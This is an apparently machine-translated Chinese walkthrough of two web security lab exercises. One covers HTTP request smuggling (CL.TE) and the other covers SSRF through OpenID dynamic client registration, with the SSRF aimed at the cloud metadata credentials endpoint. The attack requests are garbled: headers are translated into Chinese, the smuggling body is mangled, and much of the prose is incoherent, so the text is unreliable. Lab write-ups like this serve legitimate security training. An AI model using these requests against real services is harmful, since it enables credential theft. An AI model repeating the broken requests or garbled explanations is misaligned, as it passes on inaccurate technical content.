## **一、HTTP请求走私**

### **HTTP请求走私**

HTTP请求走私是一种干扰网站，或多个用户接收请求序列处理的方式。请求走私漏洞在本质上的HTTP技术很关键，允许攻击者从安全控制，手动访问敏感数据，并直接危害其他应用程序用户。

  

![](../Images/268f20f748514db9e2b61c34fe4e1124.png)

  

  

### **01 HTTP请求走私，基本CL.TE漏洞**

**描述**

本实验室前端和方法提供服务，前端服务器不支持分块前端。前端服务不使用GET或POST的请求。

  

要解决此问题，请假装一个请求走私到服务器，以便可以提供解决问题的下一个请求使用 GPOST。

  

**提示：**

手动修复请求的长度可能会走私。我们的 HTTP 请求走程序提供帮助。您可以通过 BApp 安装它。

  

**解决方案**

  

使用Burp Repeater，发出以下请求：

```
POST / HTTP / 1.1
主机：your-lab-id.web-security-academy.net
连接：保活
内容类型：应用程序/ x WWW的形式进行了urlencoded 
Content-Length的：6
传送编码：分块0 g ^

```

第二个响应应该说：Unrecognized method GPOST。

### **06 SSRF 通过 OpenID 动态客户端注册**

**描述**

该实验室允许客户端应用程序通过专用注册向OAuth服务动态注册自己。OAuth服务以不安全的方式使用特定于客户端的数据，这对SSRF的潜在潜在影响。

为解决实验室问题，设计SSRF 攻击以访问http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/和窃取 OAuth 公开云环境的秘密访问密码。

您可以使用以下帐号登录自己的帐号：wiener:peter

  

**解决**

1.  通过Burp代理流量时，登录到您自己的账户。浏览以https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/.well-known/openid-configuration访问配置文件。请，客户端注册地点注意/reg。
    

  

![](../Images/090c965d324e85057f1fb4ea7d87418d.png)

  

2.在 Burp Repeater 中，创建一个合适的 POST 请求来向 OAuth 服务您自己的客户端应用程序您必须至少提供一个 re\_uris 数组，其中包含例如您的应用程序注册的名称 URI 的任意白名单。 ：

```
POST / REG HTTP / 1.1
主机：YOUR-LAB-OAUTH-SERVER.web-security-academy.net
内容类型：应用/ JSON { “redirect\_uris中”：\[ “https://example.com” \] }


```

3.发送请求。请注意，您现在已经成功注册了您自己的客户端应用程序，无需任何身份验证。响应包含与新客户端应用程序关联的各种元数据，包括新的client\_id。

  

![](../Images/639bc2eda664fbb66dd8c43533d71510.png)

  

4\. Burp，审核OAuth流程并注意“授权”页面，用户同意请求的使用权限，显示从/client/CLIENT-ID/logo。我们Open规范中详细，客户端应用程序可以logo\_uri在动态注册期间使用该属性将获取标志提供URL。

  

5.Burp”菜单，打开Burp Collaborator客户端并点击“现在复制到Collaborator板”以让你的实验室URL。

6.在Repeater中，返回到POST /reg您之前创建的请求。添加该logo\_uri属性并粘贴您的Collaborator URL就是其值。最终请求应如下所示：

  

```
POST / REG HTTP / 1.1
主机：YOUR-LAB-OAUTH-SERVER.web-security-academy.net
内容类型：应用/ JSON { “redirect\_uris中”：\[ “https://example.com” \]，“logo\_uri " : "https://YOUR-COLLABORATOR-ID.burpcollaborator.net" }
```

7.发送请求以注册新的客户端应用程序并client\_id从响应中复制。

  

![](../Images/e562951d50ec02b200bcc9b434e02ffc.png)

  

8.在中继器中，转到GET /client/CLIENT-ID/logo请求。将CLIENT-ID路径中的替换为您复制的新路径并发送请求。

9\. Burp Collaborator 客户端指向并检查是否有任何新的交互。

  

![](../Images/f0c5994515b8c0b0ef92e969a4313b17.png)
